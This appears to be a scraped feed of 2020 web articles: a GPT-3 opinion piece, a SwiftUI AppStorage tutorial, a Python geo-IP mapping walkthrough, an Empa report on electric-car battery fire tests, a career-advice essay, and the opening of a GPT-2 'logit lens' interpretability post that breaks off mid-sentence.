<p>As I write this, <strong><a href="https://onezero.medium.com/gpt-3-is-an-amazing-research-tool-openai-isnt-sharing-the-code-d048ba39bbfd" target="_blank" rel="noreferrer noopener">OpenAI refuses to give away the source code despite its goal of transparency</a></strong>. The official reason? This technology is too big and greedy for people to run it themselves. They put it behind <a href="https://beta.openai.com/" target="_blank" rel="noreferrer noopener">a paywall</a> that allows OpenAI to monetize its research.</p>



<p>Two months after the first appearance of GPT-3, most people agree on one thing. <a href="https://www.forbes.com/sites/robtoews/2020/07/19/gpt-3-is-amazingand-overhyped/#36405ce81b1c" target="_blank" rel="noreferrer noopener"><strong>GPT-3 is as superb as overrated.</strong></a> And this is especially true for developers.</p>



<h3>Overhyped</h3>



<p>GPT-3 is super impressive. It’s a great tool to do a lot of things. <strong>But the important thing to understand is that <a href="https://www.technologyreview.com/2020/08/22/1007539/gpt3-openai-language-generator-artificial-intelligence-ai-opinion/" target="_blank" rel="noreferrer noopener">GPT-3 doesn’t understand anything it produces</a></strong>. It makes a mathematical prediction that certain letters should appear in a certain order.</p>



<p><strong>A developer’s job is infinitely more complicated.</strong> Developing a complete application that meets a human need requires a lot of thought. No algorithm has the ability to think about problems the way humans do. No thinking, no reasoning ability, no nothing…</p>



<figure><img src="https://i.ytimg.com/vi/ZVSbJQuPouw/maxresdefault.jpg" data-src="https://i.ytimg.com/vi/ZVSbJQuPouw/maxresdefault.jpg" alt=""></figure>



<p>Going further in the reflection we realize that <strong>GPT-3 is simply a new tool for developers</strong>. It is almost a new language where the interface would be directly explanations of what needs to be done instead of code.</p>



<p>And it’s quite relevant to compare the instructions given in GPT-3 to code. <strong>GPT-3 doesn’t understand vague requirements.</strong> GPT-3 needs very precise, surgical instructions, or it will produce crap. Where a human being will translate, correct and arrange vague requirements, GPT-3 will just produce crap. Or produce nothing at all.</p>



<p>GPT-3 is the largest look-up table ever created. Superintelligence is another story. It’s anything but today, and Sam Altam, the second founder of OpenAI, says so himself.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">The GPT-3 hype is way too much. It’s impressive (thanks for the nice compliments!) but it still has serious weaknesses and sometimes makes very silly mistakes. AI is going to change the world, but GPT-3 is just a very early glimpse. We have a lot still to figure out.</p>— Sam Altman (@sama) <a href="https://twitter.com/sama/status/1284922296348454913?ref_src=twsrc%5Etfw">July 19, 2020</a></blockquote>
</div></figure>



<p>And all this, not to mention the many limitations and nonsense that GPT-3 produces every day. So right now, developer are safe. </p>



<h3>What about tomorrow?</h3>



<p>Last year, I posted this article on <a href="https://www.jesuisundev.com/quel-avenir-pour-les-developpeureuses-informatiques/" target="_blank" rel="noreferrer noopener">the future of developers</a> (french version). I’m talking about no-code, low-code, quantum computing and many other nice things. <strong>I made the crazy prediction that in 30 years (that’s a lot) the machine will start to nibble away at some parts of our work.</strong> No replacement, just a nibbling of certain tasks, or even certain parts.</p>



<p>I had been crucified. Insults by email and on Twitter, unsubscribing and disappointment. I left the comments section as is (as always), it’s a beauty.</p>



<p>A year later, GPT-3 makes its appearance and proves that some very simple developer tasks can already be delegated to the machine.</p>



<figure><img src="https://i.imgur.com/i7j0QCj.jpg" data-src="https://i.imgur.com/i7j0QCj.jpg" alt=""></figure>



<p>GPT-3 can’t do anything against the job of developer. <strong>But this technology raises <a href="https://towardsdatascience.com/openais-gpt-3-the-end-of-cargo-cult-programmers-23102f70f855" target="_blank" rel="noreferrer noopener">the skill bar for becoming a developer very slightly</a>.</strong> To do what the machine can’t do on its own.</p>



<p>And if this bar is already rising today, where will it be in 30 years? I’m the first to find the speeches that demonize current IAs ridiculous. But the speeches that talk about an AI as stupid as its feet for eternity seem very naive to me. <strong>Where will be the skill bar needed to beat the machine in 30 years?</strong></p>



<p>I am also well aware that the way we make artificial intelligence today is <a href="https://www.zdnet.com/article/openais-gigantic-gpt-3-hints-at-the-limits-of-language-models-for-ai/" target="_blank" rel="noreferrer noopener">reaching a ceiling</a>. <strong>It would take a new and innovative way of doing artificial intelligence to make sense of my concerns.</strong> How can we be sure that these new ways of doing things will not emerge in the future?</p>



<h3>Epilogue</h3>



<p>For now, the future of programming is programming. Artificial intelligence continues its path, but as long as it doesn’t understand what it does, it’s going to be fine. You just have to put up with the fact that it is capable of more and more destabilizing things. How can you be sure that the article you just read is not written by an artificial intelligence?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br> On iOS 14 we have two new property wrappers in SwiftUI: <a href="https://developer.apple.com/documentation/swiftui/appstorage" target="_blank" rel="noopener">AppStorage</a> and <a href="https://developer.apple.com/documentation/swiftui/scenestorage" target="_blank" rel="noopener">SceneStorage</a>. <code>AppStorage</code> is usually used to persist some user specific settings and <code>SceneStorage</code> is designed for state restoration.</p><p><br> It's very easy to use these properties when we want to persist value types that they support out of the box, those are <code>Bool</code>, <code>Int</code>, <code>Double</code>, <code>String</code>, <code>URL</code> and <code>Data</code>. For example, we can save the user's chosen city in a weather app using <code>AppStorage</code>.</p><pre><code><span>struct</span> ContentView: <span>View</span> {
    <span>@AppStorage</span>(<span>"city"</span>) <span>var</span> city = <span>""</span>

    <span>var</span> body: <span>some</span> <span>View</span> {
        <span>TextField</span>(<span>"Enter your city"</span>, text: $city)
    }
}
</code></pre><p><br> But we need to do a bit more work if we want to save a type that is not supported by <code>AppStorage</code> or <code>SceneStorage</code> by default. They both have initializers that accept a <a href="https://developer.apple.com/documentation/swift/rawrepresentable" target="_blank" rel="noopener">RawRepresentable</a> where RawValue is of type <code>Int</code> or <code>String</code>. So we would need to add conformance to <code>RawRepresentable</code> to our custom type.</p><p><br> It's important to note though that we shouldn't be using <code>AppStorage</code> and <code>SceneStorage</code> as a replacement for a database, they are designed to save small pieces of data. But sometimes an app setting or a view state are represented by a custom type and this would be the use case described in this article.</p><p><br> As an example, we will look at a recipe app where the users can pin up to 3 recipes to the top of the list. You can get the full code for the example project from <a href="https://github.com/LostMoa/SwiftUI-Code-Examples/blob/main/SaveCustomCodableTypesInAppStorageOrSceneStorage/SaveCustomCodableTypesInAppStorageOrSceneStorage.swift" target="_blank" rel="noopener">GitHub</a>.</p><p><img src="https://lostmoa.com/static/blog/SaveCustomCodableTypeInAppStorageOrSceneStorage/AppScreenshot1.bTTXhDqwYkZOpDi5NSMvqJA2HcN0r-wP_o7zN7jM-4w.png" srcset="https://lostmoa.com/static/blog/SaveCustomCodableTypeInAppStorageOrSceneStorage/AppScreenshot1@2x.nG4t2IwD6dS4_8f-xzWxtS8jMBZ_svjM-E0e3WZAnYU.png 2x, https://lostmoa.com/static/blog/SaveCustomCodableTypeInAppStorageOrSceneStorage/AppScreenshot1@3x.mAaEKB-NAqgllCDMFLK5Q1wBj9R-AcVgA3pKgm87gv8.png 3x" alt="Recipe app screenshot">

</p><p><br> The pinned recipes in our case are a user setting that should be persisted for the whole app, not per scene, so we will be using <code>AppStorage</code>. But the approach with <code>RawRepresentable</code> conformance can be used for <code>SceneStorage</code> as well.</p><p><br> Our custom type to be saved in <code>AppStorage</code> is an Array of <code>UUID</code>s which is <code>Codable</code> by default. You might need to add <a href="https://developer.apple.com/documentation/swift/codable" target="_blank" rel="noopener">Codable</a> conformance to your type manually.</p><pre><code><span>typealias</span> PinnedRecipes = [<span>UUID</span>]
</code></pre><p><br> Now we need to add <a href="https://developer.apple.com/documentation/swift/rawrepresentable" target="_blank" rel="noopener">RawRepresentable</a> conformance to our custom <code>Codable</code> type. Remember, that <code>AppStorage</code> only supports <code>RawRepresentable</code> where the RawValue <code>associatedtype</code> is of type <code>Int</code> or <code>String</code>. So the <code>rawValue</code> property has to return an <code>Int</code> or a <code>String</code>.</p><pre><code><span>extension</span> <span>PinnedRecipes</span>: <span>RawRepresentable</span> {
    <span>public init</span>?(rawValue: <span>String</span>) {
        <span>guard let</span> data = rawValue.<span>data</span>(using: .<span>utf8</span>),
            <span>let</span> result = <span>try</span>? <span>JSONDecoder</span>().<span>decode</span>(<span>PinnedRecipes</span>.<span>self</span>, from: data)
        <span>else</span> {
            <span>return nil</span>
        }
        <span>self</span> = result
    }

    <span>public var</span> rawValue: <span>String</span> {
        <span>guard let</span> data = <span>try</span>? <span>JSONEncoder</span>().<span>encode</span>(<span>self</span>),
            <span>let</span> result = <span>String</span>(data: data, encoding: .<span>utf8</span>)
        <span>else</span> {
            <span>return</span> <span>"[]"</span>
        }
        <span>return</span> result
    }
}
</code></pre><p><br> Once our type conforms to <code>RawRepresentable</code> we can use it with <code>AppStorage</code> or <code>SceneStorage</code>.</p><pre><code><span>struct</span> ContentView: <span>View</span> {
    <span>@AppStorage</span>(<span>"pinnedRecipes"</span>) <span>var</span> pinnedRecipes = <span>PinnedRecipes</span>()
    
    <span>var</span> body: <span>some</span> <span>View</span> {
        <span>List</span> {
            <span>Section</span>(header: <span>Text</span>(<span>"Pinned Recipes"</span>)) {
                <span>ForEach</span>(pinnedRecipes, id: \.<span>self</span>) { id <span>in</span>
                    ...
                }
            }
        }
    }
}
</code></pre><p><br> You can use this approach to save a custom struct, a dictionary or an enum with associated values.</p><p><br> Feel free to take the full code for the example project from <a href="https://github.com/LostMoa/SwiftUI-Code-Examples/blob/main/SaveCustomCodableTypesInAppStorageOrSceneStorage/SaveCustomCodableTypesInAppStorageOrSceneStorage.swift" target="_blank" rel="noopener">GitHub</a> and experiment.</p></div></div>]]>

September 2, 2020 | https://blog.reconinfosec.com/visualizing-geo-ip-information-in-python/ | <a href="https://web.archive.org/web/*/https://blog.reconinfosec.com/visualizing-geo-ip-information-in-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>As part of the <a href="https://twitter.com/hashtag/OpenSOC">#OpenSOC</a> event Recon InfoSec recently conducted, we wanted to visualize where all of our participants were coming from. We had several data points to work from, and there are plenty of open tools available, so it is just a matter of cobbling those items together to create a sweet, sweet map.</p>
<h2 id="geolocatingipaddresses">Geolocating IP addresses</h2>
<p>A simple resource we found for mapping a physical location to an IP address are the free <a href="https://dev.maxmind.com/geoip/geoip2/geolite2/">Maxmind databases</a>. Maxmind provides their "GeoLite2" databases for the cost of creating an account. For example, in our case, we wanted to draw a world map indicating where participants were coming from. Maxmind provides a <em>Country</em> database which we downloaded and queried against.</p>
<p>They also provide a solid <a href="https://github.com/maxmind/GeoIP2-python">Python library on Github</a> which you can use to easily interact with the databases.</p>
<p>In this case we use the database and Python module as such:</p>
<pre><code>import geoip2.database
reader = geoip2.database.Reader('GeoLite2-Country.mmdb')
iso_code = reader.country(ip_address).country.iso_code
</code></pre>
<p>This returns an <em>Alpha-2</em> <a href="https://en.wikipedia.org/wiki/List_of_ISO_3166_country_codes">ISO code</a> which we can later use to fill a map.</p>
<h3 id="converttoiso3">Convert to ISO-3</h3>
<p>The <a href="https://plotly.com/graphing-libraries/">plotly</a> map we are using <a href="https://plotly.com/python-api-reference/generated/plotly.express.choropleth.html#plotly.express.choropleth">requires the ISO-3/Alpha-3 code</a> versus the Alpha-2 code generated from Maxmind. Luckily, there is a module for this conversion: <a href="https://pypi.org/project/pycountry/">pycountry</a>.</p>
<pre><code>import pycountry

alpha_3 = pycountry.countries.get(alpha_2=iso_code).alpha_3
</code></pre>
<p>If we bin these codes together, we have a distribution of participants by country:</p>
<pre><code>if alpha_3 not in iso_codes:
  iso_codes[alpha_3] = 0
iso_codes[alpha_3] += 1
</code></pre>
<h2 id="whataboutvpns">What about VPNs?</h2>
<p>We assumed, given our audience, that many of our security conscious participants would be using a VPN of some sort. Maxmind provides an <em>Anonymous IP</em> database which aims to tackle exactly this situation, but since WE LOVE OPEN SOURCE EVERYTHING!!, we wanted to figure this out via other methods. There are several Github repos which attempt to tackle this in several different ways.</p>
<h3 id="asnchecking">ASN checking</h3>
<p>If an IP address is originating from Amazon or Google Cloud, there is a reasonable probability that the endpoint is a VPC terminating a VPN. So, let's try to find the ASNs for our IPs, and maps those against known cloud provider ASNs. Again, Maxmind offers a database for mapping IP to ASN.</p>
<pre><code>reader = geoip2.database.Reader('GeoLite2-ASN.mmdb')
response = reader.asn(ip_address)
org = response.autonomous_system_organization
number = response.autonomous_system_number
</code></pre>
<p>ASNs don't tell us much without context, but there are several Github repos which maintain a mapping of Cloud/Colo ASNs (e.g. <a href="https://github.com/brianhama/bad-asn-list">https://github.com/brianhama/bad-asn-list</a>). Find one to your liking, and use it to get a better idea of which addresses may be coming from a cloud provider.</p>
<pre><code>if str(number) in cloud_asns:
  if org not in likely_vpns:
    likely_vpns[org] = 0
  likely_vpns[org] += 1
</code></pre>
<p>Additionally, a simple keyword search will reveal some of the bigger players:</p>
<pre><code>for org in as_organizations:
  if any(keyword in org.lower() for keyword in ["google-cloud", "aws", "amazon"]):
    if org not in likely_vpns:
      likely_vpns[org] = 0
    likely_vpns[org] += 1
</code></pre>
<p>At the end of this process, we have a binned grouping of ASNs with count.</p>
<h3 id="knownvpntorips">Known VPN/TOR IPs</h3>
<p>There are also instances of known VPN services and Tor exit nodes which may not appear in these lists and are unrelated to ASNs. For example <a href="https://github.com/ejrv/VPNs">https://github.com/ejrv/VPNs</a> provides a list of these IP addresses and the Tor Project maintains a list of exit nodes at <a href="https://check.torproject.org/torbulkexitlist">https://check.torproject.org/torbulkexitlist</a>. We can grab these lists and check the IP addresses against them as well.</p>
<pre><code>with open("tor_list.txt", "r") as f:
  tor_ips = f.read().splitlines()

if ip_address in tor_ips:
  if "tor" not in likely_vpns:
    likely_vpns["tor"] = 0
  likely_vpns["tor"] += 1
</code></pre>
<p>At this point, we have a decent list of addresses we should exclude from the country mapping results.</p>
<h2 id="preparingamap">Preparing a map</h2>
<p>We chose to use the <a href="https://plotly.com/graphing-libraries/">Plotly Graphing Libraries</a> to build a "<a href="https://en.wikipedia.org/wiki/Choropleth_map">Choropleth</a>" (think "map colored by value") (and a new term I frequently use to sound smart.)</p>
<p>In order to draw a map, you need to provide the graphing library a set of geospatial data which draws the borders, etc. These are often available as a <code>.json</code> file (e.g. <a href="https://github.com/topojson/world-atlas">https://github.com/topojson/world-atlas</a>) which plotly can ingest. We now have a list of countries and the appropriate data to start building a map.</p>
<h2 id="mapping">Mapping</h2>
<p>As an output from the previous steps, stored the data as a simple <code>.csv</code> which looked something like:</p>
<pre><code>Country,Particpants
USA,400
</code></pre>
<p>Plotly has a requirement for the <a href="https://pandas.pydata.org/">pandas</a> library so it is easy to read this data in:</p>
<pre><code>import pandas as p

df = p.read_csv("countries.txt", names=("country", "participants"))
</code></pre>
<p>Then we can read in the aforementioned geo data:</p>
<pre><code>import json

countries = {}
with open("countries.geo.json", "r") as f:
  countries = json.load(f)
</code></pre>
<p>With our data loaded, we can now build the map:</p>
<pre><code>fig = px.choropleth(df.sort_values(by=["participants"], ascending=False), 
    geojson=countries,
    locations="country",
    color="participants",
    range_color=(0, max(df["participants"])),
    scope="world",
    projection="natural earth",
    hover_data=["participants"])
</code></pre>
<p>Let's walk through some of the parameters listed there:</p>
<ul>
<li><code>df.sort_values(by=["participants"], ascending=False)</code>: <code>df</code> is our pandas dataframe (the data) and we want to sort it descending by the number of participants (per country)</li>
<li><code>geojson=countries</code>: <code>countries</code> is our geospatial data we read in earlier which helps plotly draw the borders</li>
<li><code>locations="country"</code>: this is the parameter plotly uses to color. E.g. is uses the "Alpha-3" values in the <code>country</code> column to color the individual locations present in the data</li>
<li><code>color="participants"</code>: this colors each location (country) based on the number of participants
<ul>
<li>Option 2: <code>color="country"</code>: this will color each country as a discrete color versus on a scale</li>
</ul>
</li>
<li><code>range_color=(0, max(df["participants"]))</code>: the range for the colors should span 0 to the maximum number of participants
<ul>
<li>Note: This gets a little wonky if you have an outlier on the upper end.</li>
</ul>
</li>
<li><code>scope="world"</code>: we want a world map</li>
<li><code>projection="natural earth"</code>: use a rounded projection vs a big, flat box projection</li>
<li><code>hover_data=["participants"]</code>: plotly automatically creates a pretty sweet interactive map. This allows us to see the participant count when we hover over a country</li>
</ul>
<p>There are a TON of customization and configuration options available so you can bend the map to your will.</p>

What happens if an electric car burns in a road tunnel or an underground car park? In the Hagerbach test tunnel in Switzerland, 

Swiss Federal Laboratories for Materials Science and Technology (Empa) researchers and tunnel safety expert Lars Derek Mellert set fire to battery cells of electric cars, analyzed the distribution of soot and smoke gases and the chemical residues in the extinguishing water.<br></p><p>

There’ s a loud bang, and then it starts: A battery module of an electric car is on fire in the Hagerbach test tunnel. A video of the test impressively shows the energy stored in such batteries: Meter-long flames hiss through the room and produce enormous amounts of thick, black soot. The visibility in the previously brightly lit tunnel section quickly approaches zero. After a few minutes, the battery module is completely burnt out. Ash and soot have spread throughout the room.</p><figure data-orig-width="870" data-orig-height="489"><img src="https://64.media.tumblr.com/2b820939012f3d0ea9aff8f623a876f8/41facb633e73cb10-a2/s1280x1920/6103e7a227800753c33a530cf7f81f5c4f35d503.jpg" alt="image" data-orig-width="870" data-orig-height="489" width="870" height="489"></figure><p><i>Image:&nbsp;During a fire, a battery module of an electric car develops large amounts of soot, which contains toxic metal oxides.

The results have just been published. “In our experiment we were considering in particular private and public operators of small and large underground or multi-story car parks,” says project leader Lars Derek Mellert of Amstein + Walthert Progress AG. “All these existing underground structures are being used to an increasing extent by electric cars. And the operators ask themselves: What to do if such a car catches fire? What are the health risks for my employees? What effects does such a fire have on the operation of my plant?” But until now there has been hardly any meaningful technical literature, let alone practical experience for such a case. </p><p>With the support of battery researcher Marcel Held and corrosion specialist Martin Tuchschmid from Empa, Mellert developed three test scenarios. Experts from the Hagerbach AG test tunnel and the French Centre d'études des tunnels (CETU) in Bron were also involved. “We installed test surfaces in the fire tunnel on which the soot settled,” explains Martin Tuchschmid, corrosion and fire damage specialist at Empa. “After the test, the surfaces were chemically analyzed and also stored in special rooms for several months to detect possible corrosion damage.”</p><h2><b> Scenario 1: Fire in an enclosed space</b></h2><p>The first scenario involves a fire in a closed car park without mechanical ventilation. A parking space of 28 x 28 meters area and 2.5 meters floor height was assumed. Such a floor would have an air volume of 2000 cubic meters. The fire of a small car with a fully charged battery of 32 kWh is assumed. For reasons of test economy everything was scaled down to 1/8. Thus, a fully charged battery module with 4 kWh capacity was set on fire in a room with 250 cubic meters of air volume. The tests investigated how the soot settles on tunnel walls, surfaces and on protective suits worn by firefighters on site, how toxic the residues are and by what means the fire site can be cleaned after the event.</p><h2><b>Scenario 2: Fire in a room with sprinkler system</b></h2><p>Scenario 2 deals with chemical residues in the extinguishing water. The test set-up was the same as in scenario 1. But this time, the smoke from the battery was channeled with the aid of a metal plate beneath a water shower that resembled a sprinkler system. The sooty water that rained down was collected in a basin. The battery was not extinguished, but burned out completely.

Scenario 3: Fire in a tunnel with ventilation</b></h2><p>In this scenario, the focus of the study lay on the effect of such a fire on a ventilation system. How far is the soot distributed in the exhaust ducts? Do substances that would cause corrosion settle there? In the experiment, a 4 kWh battery module was again set on fire, but this time a fan blew the smoke at a constant speed into a 160-meter-long ventilation tunnel. At a distance of 50, 100 and 150 meters from the site of the fire, the researchers had installed metal sheets in the tunnel where the soot would settle. The chemical composition of the soot and possible corrosion effects were analyzed in the Empa laboratories. </p><p>The results of the test were <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fplus.empa.ch%2Fimages%2F2020-08-17_Brandversuch-Elektroauto%2FAGT_2018_006_EMob_RiskMin_Undergr_Infrastr_Final_Report_V1.0.pdf&amp;t=YTA0OWQ2YzFmY2RlNDdjMzUwYjg2ZDNkNjgzNGZmYjQ2ZWEwYzQxYixPZWJKY2JoYg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F628179785660694528%2Fhow-dangerous-are-burning-electric-cars&amp;m=0&amp;ts=1599270302">published in a final report</a> in August 2020. Project leader Mellert reassures: In terms of heat development a burning electric car is not more hazardous than a burning car with a conventional drive. “The pollutants emitted by a burning vehicle have always been dangerous and possibly fatal,” says the final report. Regardless of the type of drive or energy storage system, the primary objective has to be to get everyone out of the danger zone as quickly as possible. The highly corrosive, toxic hydrofluoric acid has often been discussed as a particular danger in burning batteries. In the three tests in the Hagerbach tunnel, however, the concentrations remained below critical levels. </p><p>Conclusion: A tunnel ventilation system that is state-of-the-art can cope not only with burning gasoline/diesel cars, but also with electric cars. Increased corrosion damage to the ventilation system or the tunnel equipment is also unlikely based on the results now available.</p><p>Even the fire brigades do not have to learn anything new on the basis of the tests. Firefighters know that the battery of an electric car is impossible to extinguish and that it can only be cooled with large amounts of water. So the fire can possibly be limited to a few battery cells, and part of the battery will not burn out. Of course, such a partially burnt wreck must be stored in a water basin or a special container so that it cannot reignite. But this is already known to the specialists and is being practiced.</p><figure></figure><p><i>Video:&nbsp;“The experiment: Torching a battery - When electrical vehicles catch fire” by EmpaChannel, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fyoutu.be%2F2O07SIaxB08&amp;t=NjAwZmZmYTMyZmFmMjZhYzYxZGFiOTdkYTM3NzhlNTVlYjdmM2FiNSxPZWJKY2JoYg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F628179785660694528%2Fhow-dangerous-are-burning-electric-cars&amp;m=0&amp;ts=1599270302">YouTube</a>.</i></p><h2><b>The extinguishing water is poisonous</b></h2><p>A problem, however, is the extinguishing and cooling water that is produced when fighting such a fire and storing a burnt-out battery in a water basin. The analyses showed that the chemical contamination of the extinguishing water exceeds the Swiss threshold values for industrial wastewater by a factor of 70; the cooling water is even up to 100-times above threshold values. It is important that this highly contaminated water does not enter the sewage system without proper treatment.&nbsp;</p><h2><b>Professional decontamination mandatory</b></h2><p>After the trials, the tunnel was decontaminated by a professional fire clean-up team. Samples taken subsequently confirmed that the methods and time required were sufficient for the clean-up after an electric car fire. But Mellert warns especially private owners of underground garages: “Do not try to clean up the soot and dirt yourself. The soot contains large amounts of cobalt oxide, nickel oxide and manganese oxide. These heavy metals cause severe allergic reactions on unprotected skin.” So clean-up after an electric car fire is definitely a job for professionals in protective suits.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>From time to time newly graduated hackers ask me: <em>“Do you have any advice for beginning my career?”</em></p><p>I’ve found myself repeating 3 principles over and over again. On reflection, I realized these principles apply more broadly. I <em>think</em> they might answer the question <em>“Do you have any advice on for beginning my life as an adult?”</em></p><p>I thought I’d share these ideas with you here. The style and the examples I wrote are career-oriented, but I think the core ideas will still help in your decision making. I hope you enjoy them : ).</p><p><em>What should you do?</em> is one of the hardest questions to answer when you start out.</p><p>The default path is to follow what’s popular or prestigious. That can lead to a bunch of problems: What’s prestigious is already highly competitive. When you compete with smart people in a game that has established rules, just keeping up will take most of your time. That leaves little time to explore what interests you. When you don’t explore what interests you, you won’t understand things as deeply, and that leaves you with an undifferentiated skillset.</p><p><strong>The solution here is to follow your taste.</strong> Popularity and prestige are lagging indicators. Your taste, especially as a young, curious person, is a signal for <em>what will be</em> popular in the future. Regardless though, when you follow you taste, you’ll find yourself much more interested in the problems you’re solving. When you’re interested in the problems you’re solving, you’ll discover deeper truths, build deeper expertise, a differentiated skillset, and have more fun along the way.</p><p>Now, you may be wondering: <strong>What if you don’t even know what you’re interested in?</strong></p><p>Don’t worry. You just need to tune into and strengthen your taste. To do that, just do <em>anything</em>. Once you do <em>anything</em>, ask yourself, what part of that thing do you  find interesting?</p><p>Start going deeper there, and all of a sudden, you’ll discover a wealth of interests.</p><p>Next up, you may be wondering: <strong>What if your interests keep changing?</strong></p><p>Don’t worry. It’s totally fine. Just follow it. You’ll be surprised how things will serve you down the road. As long as you’re working hard and you’re learning, it’s a good use of time.</p><p>You may also wonder: <strong>What if your interests <em>are</em> what’s popular and prestigious today?</strong></p><p>That’s great. Follow that, but instead of competing, start sensing what actually interests you in that field and go deeper.</p><p>The ideas may seem career oriented, so you may be wondering: <strong>What if I just want to travel and explore the world?</strong></p><p>That’s great too! It’s your taste, telling you that you want to travel. Follow it and see where it leads you.</p><p>As you discover your interests, you may find that they’re not necessarily popular. Yet, when you go deeper and do your thing, something magical will happen…which leads us into the second principle:</p><p>As you explore and follow your taste, you’ll discover a subset of people who share your core interests and values.</p><p>Nurture those relationships. Some of these people will be your friends for life. Many of those people will become very successful in the future.</p><p>The people you know will show you what’s possible and work alongside you in deepening, exploring, and innovating on your shared interests.</p><p>You may be wondering: <em>what if you live in the middle of nowhere, and there aren’t people who get you?</em> Do your best to go to the center of wherever your community is. That may be SF for hackers or Los Angeles for entertainers or Paris for artists, the list goes on. You know where it is for you.</p><p>Now, this may sound impractical to you, but you’ll be surprised with what you can do. You can start off online in the meantime.</p><p>One common pitfall here is <em>focusing only on successful people in your field.</em> This misses the point. Sure, reach out to those successful people, but remember that the young, curious, interested people right next you, <em>will become those successful people in the future.</em> You have tons of time to spend together, so it’s great way to deepen your relationships. I’m not saying that you shouldn’t reach out to successful people (you definitely should), but to remove “success” as a criteria altogether for choosing who you spend your time with.</p><p>Now, you may be wondering, <em>how do you deepen those relationships?</em> That leads to us to the third principle:</p><p>As you form your community, new ideas and ways to collaborate will spring up. Take those opportunities: work together, support each-other and play. Over time, which you have a lot of right now, you will form a tight tribe of friends.</p><p>As a happy side effect, you’ll become exposed to new fields, new technologies, interesting problems, and interesting opportunities. Start taking them, and you’re well on your way to a career that’s <em>made for you.</em></p><p>One common issue here is a lack of self belief. This may lead you into choosing what you think “you are capable of”, rather than what you’re interested in. One way to get around this is to just experiment: let yourself dream and work with your friends, even if the problems seem fantastically hard.</p><p>There are a lot of examples I can give you if you’re interested in what I’m interesting in: From <a href="https://m.stopa.io/my-favorite-books-11e6b5a3ac0a" target="_blank">my favorite books</a> to <a href="http://www.paulgraham.com/articles.html" target="_blank">Paul Graham’s essays</a> to <a href="https://www.amazon.com/Paradigms-Artificial-Intelligence-Programming-Studies/dp/1558601910" target="_blank">Norvig’s Paradgims of AI programming</a>, to <a href="https://m.stopa.io/favorite-rich-hickey-talks-6bcb23da6ff2" target="_blank">Rich Hickey talks</a>. But, instead I encourage you to think: <em>what interests you right now?</em></p><p>If you’re up for it, I’d love to know your answer: <strong><em>what interests you right now?</em></strong> Feel free to leave your answer in the comments or to email me directly, I’d be curious to hear : )</p><p>There’s a slew of people who have influenced and mentored me. These ideas are just as much them as me.</p><p>On the idea of taste specifically, the big shoutout has to go to Paul Graham. A lot of my thinking about this was inspired by reading his essays over and over when I started out. I highly suggest reading them.</p><p><em>Thanks to Daniel Woelfel, Talha Baig, Martin Raison, Irakli Safareli, David Magaltadze, Joe Averbukh, Julien Odent, for reviewing this essay</em></p></span></p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>This post relates an observation I've made in my work with GPT-2, which I have not seen made elsewhere.</p><p>IMO, this observation sheds a good deal of light on how the GPT-2/3/etc models (hereafter just "GPT") work internally.</p><p>There is an accompanying <a href="https://colab.research.google.com/drive/1-nOE-Qyia3ElM17qrdoHAtGmLCPUZijg?usp=sharing">Colab notebook</a> which will let you interactively explore the phenomenon I describe here.</p><p>[Edit: updated with another section on comparing to the inputs, rather than the outputs.  This arguably resolves some of my confusion at the end.  Thanks to algon33 and Gurkenglas for relevant suggestions here.]</p><ul><li>GPT's probabilistic predictions are a linear function of the activations in its final layer.  If one applies the same function to the activations of <em>intermediate </em>GPT layers, the resulting distributions make intuitive sense.</li><ul><li>This "logit lens" provides a simple (if partial) interpretability lens for GPT's internals.</li><li>Other work on interpreting transformer internals has focused mostly on what the attention is looking at.  The logit lens focuses on <em>what</em> GPT "believes" after each step of processing, rather than <em>how</em> it updates that belief inside the step.</li></ul><li>These distributions gradually converge to the final distribution over the layers of the network, often getting close to that distribution long before the end.</li><ul><li>At some point in the middle, GPT will have formed a "pretty good guess" as to the next token, and the later layers seem to be refining these guesses in light of one another.</li><li>The general trend, as one moves from earlier to later layers, is </li><ul><li>"nonsense / not interpretable" (sometimes, in very early layers) --&gt; </li><li>"shallow guesses (words that are the right part of speech / register / etc)" --&gt;</li><li>"better guesses"</li></ul><li>...though some of those phases are sometimes absent.</li></ul><li>On the other hand, o<em>nly </em>the inputs look like the input tokens.</li><ul><li>In the logit lens, the early layers sometimes look like nonsense, and sometimes look like very simple guesses about the output.  They almost never look like the input.</li><li>Apparently, the model does not "keep the inputs around" for a while and gradually process them into some intermediate representation, then into a prediction.</li><li>Instead, the inputs are <em>immediately </em>converted to a very different representation, which is smoothly refined into the final prediction.</li></ul><li>This is reminiscent of the perspective in <a href="https://arxiv.org/abs/1807.03819">Universal Transformers </a>which sees transformers as iteratively refining a guess.</li><ul><li>However, Universal Transformers have both an encoder and decoder, while GPT is only a decoder.  This means GPT faces a tradeoff between keeping around the input tokens, and producing the next tokens.</li><li><em>Eventually</em> it has to spit out the next token, so the longer it spends (in depth terms) processing something that looks like token <em>i, </em>the less time it has to convert it into token <em>i+1</em>.  GPT has a deadline, and the clock is ticking.</li></ul><li>More speculatively, this suggests that GPT mostly "thinks in predictive space," immediately converting inputs to predicted outputs, then refining guesses in light of other guesses that are themselves being refined.</li><ul><li>I think this might suggest there is some fundamentally better way to do sampling from GPT models?  I'm having trouble writing out the intuition clearly, so I'll leave it for later posts.</li></ul><li>Caveat: I call this a "lens" because it is one way of extracting information from GPT's internal activations.  I imagine there is other information present in the activations that cannot be understood by looking at logits over tokens.  The logit lens show us some of what is going on, not all of it.</li></ul><p>You can skip or skim this if you already know it.</p><ul><li> Input and output</li><ul><li>As <em>input,</em> GPT takes a sequence of tokens. Each token is a single item from a vocabulary of <em>N_v</em>=50257 byte pairs (mostly English words).</li><li>As <em>output,</em> GPT returns a probability distribution over the vocabulary. It is trained so this distribution predicts the next token.</li><li>That is, the model's outputs are shifted forward by one 